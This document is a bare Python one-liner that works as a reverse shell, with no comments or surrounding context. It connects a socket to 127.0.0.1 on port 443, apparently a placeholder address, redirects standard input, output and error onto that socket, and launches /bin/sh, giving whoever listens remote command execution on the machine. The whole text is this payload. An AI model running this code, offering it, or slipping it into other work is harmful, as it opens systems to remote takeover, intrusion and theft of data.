import socket,subprocess,os;s=socket.socket();s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call("/bin/sh");
